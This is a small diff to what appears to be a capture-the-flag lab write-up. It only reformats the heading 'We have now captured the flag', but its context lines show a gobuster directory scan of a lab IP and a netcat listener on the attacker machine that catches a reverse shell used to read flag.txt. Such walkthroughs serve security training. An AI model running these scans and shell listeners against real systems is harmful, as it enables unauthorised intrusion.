@@ -225,4 +225,5 @@ gobuster dir -u http://192.168.64.134 -w /usr/share/wordlists/rockyou.txt
         
     nc -nlvp 3333 on attacker machine
      15 connection succesful, cat flag.txt. 
-** We have now captured the flag.
+
+## We have now captured the flag.
